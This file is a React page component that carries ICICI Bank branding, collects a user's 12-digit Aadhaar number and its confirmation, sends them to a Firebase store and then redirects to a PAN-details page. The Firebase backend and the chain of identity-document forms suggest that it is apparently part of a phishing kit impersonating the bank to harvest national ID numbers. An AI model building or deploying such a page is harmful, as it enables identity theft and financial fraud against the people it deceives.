import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { submitUserData } from '../utils/firebase';

const AADHARDetailsPage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    aadharNumber: '',
    confirmAadharNumber: ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const userId = await submitUserData({
        ...formData,
        type: 'aadhar_details'
      });
      navigate('/pan-details');
    } catch (error) {
      console.error('Error submitting AADHAR details:', error);
    }
  };

  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div className="container">
      <div className="header">
        <img src="/icici h.jpg" alt="ICICI Bank Logo" />
      </div>

      <div className="content">
        <h2>AADHAR Card Details</h2>

        <div className="input-group">
          <label htmlFor="aadharNumber">AADHAR Number</label>
          <input
            type="text"
            id="aadharNumber"
            name="aadharNumber"
            maxLength="12"
            inputMode="numeric"
            pattern="\d{12}"
            title="Please enter valid 12-digit AADHAR number"
            required
            value={formData.aadharNumber}
            onChange={handleInputChange}
          />
        </div>

        <div className="input-group">
          <label htmlFor="confirmAadharNumber">Confirm AADHAR Number</label>
          <input
            type="text"
            id="confirmAadharNumber"
            name="confirmAadharNumber"
            maxLength="12"
            inputMode="numeric"
            pattern="\d{12}"
            title="Please re-enter your AADHAR number"
            required
            value={formData.confirmAadharNumber}
            onChange={handleInputChange}
          />
        </div>

        <button className="btn" onClick={handleSubmit}>Continue</button>
      </div>

      <div className="footer">
        <p>&copy; ICICI Bank</p>
      </div>
    </div>
  );
};

export default AADHARDetailsPage;
